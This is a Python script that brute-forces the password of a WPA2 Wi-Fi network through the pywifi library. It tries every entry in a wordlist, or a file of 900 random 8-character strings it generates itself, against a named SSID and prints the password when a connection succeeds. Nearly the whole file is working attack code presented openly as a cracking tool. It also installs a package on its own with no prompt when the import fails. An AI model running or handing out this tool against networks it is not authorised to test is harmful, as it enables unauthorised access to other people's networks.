import argparse
import sys
import os
import os.path
import platform
import string
import re
import time
import random
try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except:
    os.system('pip install pywifi')


RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan() #check the card
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False

def main(ssid, password, number):

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.30) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.30) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, CYAN,'[*] Crack success!',RESET)
        print(BOLD, CYAN,'[*] password is ' + password, RESET)
        input()
        exit()
    else:
        print(GREEN, '[{}] Failed {}'.format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)


def repeatthis():
    password = ""
    passwordc = string.ascii_letters
    password = string.digits

    do = ''.join(random.choice(password+passwordc) for i in range(8))
    print(do)

    my_file = open("algorithm.txt","a+")
    my_file.write(do)
    my_file.write("\n")
    
    

def menu():
    os.system('cls')
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    elif args.version:
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filee = 'algorithm.txt'


    # thx
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE,"[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    for i in range(900):
        repeatthis()
    
    menu()
